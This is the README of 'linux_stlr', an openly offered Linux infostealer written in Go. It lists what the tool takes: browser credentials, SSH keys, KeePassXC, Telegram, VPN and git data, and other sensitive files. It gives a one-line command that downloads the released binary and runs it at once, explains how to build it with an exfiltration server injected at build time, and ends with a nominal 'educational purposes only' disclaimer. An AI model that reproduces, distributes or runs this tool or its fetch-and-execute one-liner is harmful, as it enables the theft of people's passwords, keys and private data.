# linux_stlr

A linux stealer with support for:
- gecko based browsers
- chrome based browsers
- sensitive files
- host information
- ssh keys
- remmina
- pidgin
- mullvad
- git
- telegram
- openvpn
- keepassxc

This stealer has support for uploading to a file server but a file server is not included in the repo. Instead, If a webserver is not injected at build time with `-X main.Host` it will gather all the files in a zip file and place it in the current directory.

## one liner
```
wget https://github.com/notathrow/linux_stlr/releases/download/v1.0.6/linux_stlr -O ./linux_stlr;chmod +x ./linux_stlr;./linux_stlr
```

  ## build from source

1. Install golang:
  https://go.dev/doc/install

2. clone and compile Compile:
```
git clone https://github.com/notathrow/linux_stlr
cd linux_stlr
GOOS=linux go build
```
output file should be `linux_stlr` in build directory.

3. Place output file on test machine.
4. Give executable permissions:
```
chmod +x ./linux_stlr
```
5. Execute
```
./linux_stlr
```
6. Now `s.zip` should appear in the directory of execution.

## Legal Disclaimer 
This project was made for educational purposes only. using infomation gathering tools on data that is not your own is ILLEGAL.


  
